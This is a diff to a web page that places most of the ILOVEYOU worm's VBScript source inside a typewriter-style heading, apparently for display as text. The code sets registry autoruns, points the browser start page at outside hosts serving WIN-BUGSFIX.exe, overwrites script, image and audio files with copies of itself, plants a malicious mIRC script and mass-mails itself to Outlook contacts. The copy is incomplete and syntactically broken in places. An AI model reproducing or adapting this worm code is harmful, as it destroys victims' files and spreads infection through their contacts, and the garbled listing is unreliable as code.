@@ -9,9 +9,268 @@
     <link rel="stylesheet" href="css/styles.css">
 </head>
 <body>
-    <h5 class="typewriter">
-        ILOVEYOU
+    <h5 id="typewriter">
         
+Sub main()<br>
+  On Error Resume Next<br>
+  Dim wscr, rr<br><br>
+
+  Set wscr = CreateObject("WScript.Shell")<br>
+  rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")<br>
+
+  If (rr >= 1) Then<br>
+    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"<br>
+  End If<br>
+
+  Set dirwin = fso.GetSpecialFolder(0)<br>
+  Set dirsystem = fso.GetSpecialFolder(1)<br>
+  Set dirtemp = fso.GetSpecialFolder(2)<br>
+  Set c = fso.GetFile(WScript.ScriptFullName)<br>
+
+  c.Copy(dirsystem & "\MSKernel32.vbs")<br>
+  c.Copy(dirwin & "\Win32DLL.vbs")<br>
+  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")<br><br>
+
+  regruns()<br>
+  html()<br>
+  spreadtoemail()<br>
+  listadriv()<br>
+End Sub<br><br>
+
+Sub regruns()<br>
+  On Error Resume Next<br>
+  Dim num, downread<br><br>
+
+  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"<br>
+  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"<br><br>
+
+  downread = ""<br>
+  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")<br><br>
+
+  If (downread = "") Then<br>
+    downread = "c:\"<br>
+  End If<br><br>
+
+  If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then<br>
+    Randomize<br><br>
+
+    num = Int((4 * Rnd) + 1)<br><br>
+
+    If num = 1 Then<br>
+      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"<br>
+    ElseIf num = 2 Then<br>
+      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"<br>
+    ElseIf num = 3 Then<br>
+      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"<br>
+    ElseIf num = 4 Then<br>
+      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"<br>
+    End If<br>
+  End If<br><br>
+
+  If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then<br>
+    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"<br>
+    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"<br>
+  End If<br>
+End Sub<br><br>
+
+Sub listadriv()<br>
+  On Error Resume Next<br>
+  Dim d, dc, s<br><br>
+
+  Set dc = fso.Drives<br><br>
+
+  For Each d In dc<br>
+    If (d.DriveType = 2) Or (d.DriveType = 3) Then<br>
+      folderlist(d.path & "\")<br>
+    End If<br>
+  Next<br><br>
+
+  listadriv = s<br>
+End Sub<br><br>
+
+Sub infectfiles(folderspec)<br>
+  On Error Resume Next<br>
+  Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3<br><br>
+
+  Set f = fso.GetFolder(folderspec)<br>
+  Set fc = f.Files<br><br>
+
+  For Each f1 In fc<br>
+    ext = fso.GetExtensionName(f1.path)<br>
+    ext = lcase(ext)<br>
+    s = lcase(f1.name)<br><br>
+
+    If (ext = "vbs") Or (ext = "vbe") Then<br>
+      Set ap = fso.OpenTextFile(f1.path, 2, true)<br><br>
+
+      ap.write vbscopy<br>
+      ap.close<br>
+    ElseIf (ext = "js")<br>
+      Or (ext = "jse")<br>
+      Or (ext = "css")<br>
+      Or (ext = "wsh")<br>
+      Or (ext = "sct")<br>
+      Or (ext = "hta")<br>
+    Then<br>
+      Set ap = fso.OpenTextFile(f1.path, 2, true)<br><br>
+
+      ap.write vbscopy<br>
+      ap.close<br>
+      bname = fso.GetBaseName(f1.path)<br><br>
+
+      Set cop = fso.GetFile(f1.path)<br><br>
+
+      cop.copy(folderspec & "\" & bname & ".vbs")<br>
+      fso.DeleteFile(f1.path)<br>
+    ElseIf (ext = "jpg") Or (ext = "jpeg") Then<br>
+      rem Copies itself<br>
+      Set ap = fso.OpenTextFile(f1.path, 2, true)<br><br>
+
+      ap.write vbscopy<br>
+      ap.close<br><br>
+
+      Set cop = fso.GetFile(f1.path)<br><br>
+
+      cop.copy(f1.path & ".vbs")<br>
+      fso.DeleteFile(f1.path)<br>
+    ElseIf (ext = "mp3") Or (ext = "mp2") Then<br>
+      Set mp3 = fso.CreateTextFile(f1.path & ".vbs")<br><br>
+
+      mp3.write vbscopy<br>
+      mp3.close<br><br>
+
+      Set att = fso.GetFile(f1.path)<br>
+      att.attributes = att.attributes + 2<br>
+    End If<br><br>
+
+    If (eq <> folderspec) Then<br>
+      rem Looks for mIRC and related files to determine whether it<br>
+      rem should create/replace its script.ini with a malicious script.<br>
+      If (s = "mirc32.exe")<br>
+        Or (s = "mlink32.exe")<br>
+        Or (s = "mirc.ini")<br>
+        Or (s = "script.ini")<br>
+        Or (s = "mirc.hlp")<br>
+      Then<br>
+        Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")<br>
+        scriptini.WriteLine "[script]"<br>
+        scriptini.WriteLine ";mIRC Script"<br>
+        scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, If mIRC will"<br>
+        scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks"<br>
+        scriptini.WriteLine ";"<br>
+        scriptini.WriteLine ";Khaled Mardam-Bey"<br>
+        scriptini.WriteLine ";http://www.mirc.com"<br>
+        scriptini.WriteLine ";"<br>
+        scriptini.WriteLine "n0=on 1:JOIN:#:{"<br>
+        scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"<br>
+        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\LOVE-LETTER-FOR-YOU.HTM"<br>
+        scriptini.WriteLine "n3=}"<br>
+        scriptini.close<br><br>
+
+        eq = folderspec<br>
+      End If<br>
+    End If<br>
+  Next<br>
+End Sub<br><br>
+
+Sub folderlist(folderspec)<br>
+  On Error Resume Next<br>
+  Dim f, f1, sf<br><br>
+
+  Set f = fso.GetFolder(folderspec)<br>
+  Set sf = f.SubFolders<br><br>
+
+  For Each f1 In sf<br>
+    infectfiles(f1.path)<br>
+    folderlist(f1.path)<br>
+  Next<br>
+End Sub<br><br>
+
+Sub regcreate(regkey,regvalue)<br>
+  Set regedit = CreateObject("WScript.Shell")<br>
+  regedit.RegWrite regkey, regvalue<br>
+End Sub<br><br>
+
+Function regget(value)<br>
+  Set regedit = CreateObject("WScript.Shell")<br>
+  regget = regedit.RegRead(value)<br>
+End Function<br><br>
+
+Function fileexist(filespec)<br>
+  On Error Resume Next<br>
+  Dim msg<br><br>
+
+  If (fso.FileExists(filespec)) Then<br>
+    msg = 0<br>
+  Else<br>
+    msg = 1<br>
+  End If<br><br>
+
+  fileexist = msg<br>
+End Function<br><br>
+
+Function folderexist(folderspec)<br>
+  On Error Resume Next<br>
+  Dim msg<br><br>
+
+  If (fso.GetFolderExists(folderspec)) Then<br>
+    msg = 0<br>
+  Else<br>
+    msg = 1<br>
+  End If<br><br>
+
+  fileexist = msg<br>
+End Function<br><br>
+
+Sub spreadtoemail()<br>
+  On Error Resume Next<br>
+  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad<br><br>
+
+  rem Creates a shell to edit the registry.<br>
+  Set regedit = CreateObject("WScript.Shell")<br>
+  rem Creates a new Outlook application object instance, to access the MAPI.<br>
+  Set out = WScript.CreateObject("Outlook.Application")<br>
+  rem Gets the MAPI namespace used to access the address book lists.<br>
+  Set mapi = out.GetNameSpace("MAPI")<br><br>
+
+  For ctrlists = 1 To mapi.AddressLists.Count<br>
+    Set a = mapi.AddressLists(ctrlists)<br>
+    x = 1<br>
+    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)<br><br>
+
+    If (regv = "") Then<br>
+      regv = 1<br>
+    End If<br><br>
+
+    If (int(a.AddressEntries.Count) > int(regv)) Then<br>
+      For ctrentries = 1 To a.AddressEntries.Count<br>
+        malead = a.AddressEntries(x)<br>
+        regad = ""<br>
+        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )<br><br>
+
+        If (regad = "") Then<br>
+          Set male = out.CreateItem(0)<br><br>
+
+          male.Recipients.Add(malead)<br>
+          male.Subject = "ILOVEYOU"<br>
+          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."<br>
+          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")<br>
+          male.Send<br><br>
+
+          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"<br>
+        End If<br><br>
+
+        x = x + 1<br>
+      Next<br><br>
+
+      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count<br>
+    Else<br>
+      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count<br>
+    End If<br>
+  Next<br><br>
+  
     </h5>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script src="js/script.js"></script>
 </body>
 </html>
